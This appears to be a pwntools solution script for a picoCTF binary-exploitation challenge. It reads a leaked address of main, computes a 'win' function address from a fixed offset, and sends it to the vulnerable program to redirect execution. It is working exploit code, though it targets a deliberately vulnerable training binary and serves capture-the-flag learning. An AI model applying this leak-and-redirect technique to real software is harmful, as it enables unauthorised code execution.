from pwn import *

if args.REMOTE:
    HOST, PORT = "rescued-float.picoctf.net 51054".split()
    p = remote(HOST, PORT)
else:
    p = process('./vuln')

p.recvuntil(b'main: ')
main_addr = p.recvline().strip()
win_addr = hex(int(main_addr, 16) - 0x96)
p.sendlineafter(b'0x12345: ', win_addr)

p.interactive()